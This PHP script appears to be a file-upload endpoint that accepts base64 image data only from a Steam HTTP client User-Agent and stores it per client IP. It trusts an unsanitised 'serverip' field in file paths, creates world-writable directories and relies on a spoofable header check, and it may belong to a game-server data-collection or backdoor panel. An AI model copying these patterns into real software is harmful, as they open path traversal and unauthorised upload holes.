<?php
$nopebbro = 1;

include('class/include.php');

$browsers = $_SERVER['HTTP_USER_AGENT'];

if ($browsers != "Valve/Steam HTTP Client 1.0 (4000)") {
die("ERROR CREATING FILE");
}

function reloadString($length = 100) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$name = reloadString(24);

if($_POST['serverip'] == "loopback" || $_POST['serverip'] == "0.0.0.0:0"){
	$ip = $_SERVER["REMOTE_ADDR"];
}else{
	$ip = explode(':', $_POST['serverip'])[0];
}

mkdir("image/".$ip, 0777);
 
if (file_exists("image/".$ip."/".$name."e.jpg")) {
$file = "image/".$ip."/".$name."e.jpg";
// Open the file to get existing content
$current = file_get_contents($file);
// Append a new person to the file
$current .= base64_decode($_POST['data']);
// Write the contents back to the file
file_put_contents($file, $current);
}

function base64ToImage($output_file) {
    $file = fopen($output_file, "wb");

    fwrite($file, base64_decode($_POST['data']));
    fclose($file);

    return $output_file;
}

base64ToImage("image/".$ip."/".$name."e.jpg");

die("print('cbon')");



?>